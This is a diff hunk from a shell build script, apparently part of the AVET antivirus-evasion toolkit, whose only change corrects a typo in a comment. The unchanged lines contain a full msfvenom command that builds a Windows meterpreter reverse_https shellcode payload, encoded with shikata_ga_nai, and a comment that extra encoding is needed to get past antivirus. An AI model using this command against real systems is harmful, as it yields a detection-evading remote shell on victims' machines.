@@ -20,7 +20,7 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
-# additionaly to the avet encoder, further encoding should be used
+# additionally to the avet encoder, further encoding should be used
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc.txt
 
 # Apply AVET encoding via format.sh tool
